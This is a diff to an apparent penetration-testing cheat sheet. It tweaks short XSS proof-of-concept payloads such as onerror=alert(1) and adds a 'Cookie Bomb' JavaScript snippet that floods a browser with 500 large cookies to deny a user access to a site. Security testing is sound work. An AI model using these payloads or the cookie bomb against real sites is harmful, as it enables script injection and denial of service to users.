@@ -147,9 +147,8 @@ https://jlajara.gitlab.io/XSS_20_characters
 "><img/src/onerror=alert(1)>//
 '><img/src/onerror=alert(1)>//
 >"@input="this.alert`1`
->'@input="this.alert`1`
+>'@input='this.alert`1`
 &quot onerror='alert(1)'
-' onerror='alert(1)'
 " onerror='alert(1)'
 ```
 
@@ -309,6 +308,14 @@ https://kloudle.com/blog/the-infamous-8kb-aws-waf-request-body-inspection-limita
 - Identify server origin
 https://github.com/gwen001/cloudflare-origin-ip
 
+### Cookie Bomb
+Can be used to demonstrate the fact of put "low" Accessibility in a CVSS
+```js
+for (let i = 0; i < 500; i++) {
+  var a = 'A'.repeat(500);
+  document.cookie = `${i}=${a}`;
+}
+```
 
 ## Events
 ```js
